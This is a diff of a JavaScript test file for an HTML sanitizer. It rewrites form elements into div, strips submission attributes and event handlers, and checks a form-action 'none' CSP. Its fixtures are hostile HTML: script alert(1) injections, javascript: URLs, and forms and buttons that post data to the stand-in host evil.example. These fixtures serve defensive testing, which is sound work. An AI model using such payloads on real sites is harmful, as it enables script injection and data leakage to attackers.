@@ -106,10 +106,7 @@ describe('まるごと落とす要素（中身も）', () => {
     ['iframe', '<iframe src="/x" srcdoc="<script>alert(1)</script>"></iframe>'],
     ['object', '<object data="/x.swf"><param name="a" value="b"></object>'],
     ['embed', '<embed src="/x.swf">'],
-    [
-      'form',
-      '<form action="https://evil.example"><input name="q" value="LEAK"><button>送信</button></form>',
-    ],
+    // 2026-11-09 変更（8-3b）: form は中身ごと落としていたが、div に書き換える（下の「form は div に」）
     ['base', '<base href="https://evil.example/">'],
     ['svg', '<svg><script>alert(1)</script><a xlink:href="javascript:alert(1)">LEAK</a></svg>'],
     ['math', '<math><mi xlink:href="javascript:alert(1)">LEAK</mi></math>'],
@@ -166,6 +163,49 @@ describe('まるごと落とす要素（中身も）', () => {
     );
     expect(r.body).toBe('<my-card class="c">残る</my-card>');
     expect(r.stats.elements).toMatchObject({ blink: 1, marquee: 1, x: 1 });
+  });
+});
+
+describe('form は div に書き換える（中身は残す。送信に関わる属性は落とす）', () => {
+  it('form の属性（action method enctype target novalidate autocomplete name accept-charset rel）と on* は落とし、data-component は残す', () => {
+    const r = body(
+      '<form action="https://evil.example/post" method="post" enctype="multipart/form-data" target="_blank" novalidate ' +
+        'autocomplete="off" name="f" accept-charset="utf-8" rel="noopener" id="entry" class="c" data-component="EntryForm" ' +
+        'onsubmit="alert(1)"><h1>入稿</h1><input name="q" value="v"><button type="submit">保存</button></form>',
+    );
+    expect(r.body).toBe(
+      '<div id="entry" class="c" data-component="EntryForm"><h1>入稿</h1><input name="q" value="v"><button type="submit">保存</button></div>',
+    );
+    expect(r.dataComponents).toEqual(['EntryForm']);
+    expect(r.stats.elements.form).toBeUndefined();
+    expect(r.stats).toMatchObject({ handlers: 1, external: 1, unsafe: 0 });
+    expect(r.html).not.toMatch(/<form|evil|action=|method=|target=/);
+  });
+
+  it('中の input・button も許可リストのまま: formaction formmethod formtarget formenctype formnovalidate form は落とす', () => {
+    const r = body(
+      '<form action="javascript:alert(1)"><input name="q" form="other" formaction="javascript:alert(1)" formmethod="post">' +
+        '<input type="image" src="/i.png" formaction="https://evil.example" formtarget="_blank">' +
+        '<button type="submit" formaction="https://evil.example" formenctype="text/plain" formnovalidate form="f2">送信</button></form>',
+    );
+    expect(r.body).toBe(
+      '<div><input name="q"><input type="image" src="A(/i.png)"><button type="submit">送信</button></div>',
+    );
+    expect(r.stats).toMatchObject({ external: 2, unsafe: 2 });
+  });
+
+  it('入れ子の form は全部 div。閉じていない form はほかの要素と同じく中身ごと落とす', () => {
+    expect(body('<form><div><form><p>x</p></form></div></form>').body).toBe(
+      '<div><div><div><p>x</p></div></div></div>',
+    );
+    const broken = body('<div><form><p>x</p></div><p>後</p>');
+    expect(broken.body).toBe('<div></div><p>後</p>');
+    expect(broken.stats.elements['(閉じていない)']).toBe(1);
+  });
+
+  it("CSP は form-action 'none' のまま（serve の応答ヘッダにも allow-forms は無い。cli のテスト）", () => {
+    expect(SCREEN_CSP).toContain("form-action 'none'");
+    expect(SCREEN_CSP).not.toContain('allow-forms');
   });
 });
 
